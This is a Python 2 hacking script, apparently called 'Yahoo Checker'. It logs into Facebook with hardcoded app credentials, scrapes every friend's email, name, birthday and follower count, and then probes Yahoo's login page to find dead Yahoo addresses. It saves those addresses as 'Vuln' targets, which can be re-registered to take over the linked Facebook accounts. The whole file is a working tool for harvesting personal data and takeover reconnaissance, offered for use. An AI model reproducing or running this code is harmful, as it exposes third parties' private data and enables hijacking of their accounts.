#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import re
import sys
import requests
import mechanize
from time import sleep
from getpass import getpass

reload(sys)
sys.setdefaultencoding('utf8')
br=mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True) 
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders=[('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
s=requests.Session()

M="\033[0;91m"
P="\033[0;97m"
H="\033[0;92m"
B="\033[1;46m"
R="\033[0m"
url="https://graph.facebook.com/{}"
target=[]

def cloning():
	data=s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("%s[•] %semail: "%(H,P)),getpass("%s[•] %spasss: "%(H,P)))).json()
	try:
		a=data["access_token"]
	except KeyError:
		exit("%s[!]%s failed when generate access token !!"%(M,P))
	print "%s[*] %sTool : Yahoo Checker Beta"	
	print "----------------------------------------"
	print "%s[*] %sfetching all user id "%(H,P)
	sleep(1)
	try:
		for x in s.get(url.format("me/friends?access_token=%s"%(a))).json()["data"]:
			target.append(x["id"])
			print "\r%s[*] %s%s retrieved  "%(H,P,x["id"]),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		print "\n%s[!] %sfailed to retrive all user id"%(M,P)
		exit("%s[!] %sstopped"%(M,P))
	print "\n%s[*] %sall user id successfuly retrieved"%(H,P)
	print "%s[*] %sgetting email friends"%(H,P)
	print "%s[*] %sstart"%(H,P)
	print "----------------------------------------"
	o=open("mail_DIE.txt","w")
	for meki in target:
		try:
			b=s.get(url.format(meki+"?access_token=%s"%(a))).json()
			c=s.get(url.format(meki+"/subscribers?access_token=%s"%(a))).json()
			p=re.compile(r'@.*').search(b["email"]).group()
			if "yahoo.com" in p:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html=True
				br.select_form(nr=0)
				br["username"]=b["email"]
				i=br.submit().read()
				try:
					cek=re.compile(r'"messages.ERROR_INVALID_USERNAME">.*').search(i).group()
				except:continue
				if '"messages.ERROR_INVALID_USERNAME">' in cek:
					o.write("%s\n"%(b["email"]))
					print "%s[•]%s UID       : %s%s"%(H,P,H,b["id"])
					print "%s[•]%s Name      : %s%s"%(H,P,H,b["name"])
					print "%s[•]%s Email     : %s%s"%(H,P,H,b["email"])
					try:
						print "%s[•]%s Birthday  : %s%s"%(H,P,H,b["birthday"])
					except KeyError:print "%s[•]%s Birthday  : %snot found"%(M,P,M)
					print "%s[•]%s Followers : %s%s"%(H,P,H,str(c["summary"]["total_count"]))
					print "%s[•]%s Status    : %sVuln\n"%(H,P,H)
		except KeyError:pass
		except requests.exceptions.ConnectionError:
			print "%s[!]%s no connection"%(M,P)
			exit("%s[!]%s stopped"%(M,P))
	o.close()
	print "\n%s[+]%s done.."%(H,P)
	exit("%s[#] %sfile saved in: %smail_DIE.txt"%(H,P,H))

if __name__=="__main__":
	os.system("clear")
	print """%s
 \ /                __                  
  Y  _ |_  _  _    /  |_  _  _  |  _  __
  | (_|| |(_)(_)   \__| |(/_(_  |<(/_ | 
%s----------------------------------------%s
%s  Coded  :                              %s%s
%s  Github : https://github.com/          %s
%s----------------------------------------
 """%(H,P,M,B,R,M,B,R,P)
 
 	cloning()
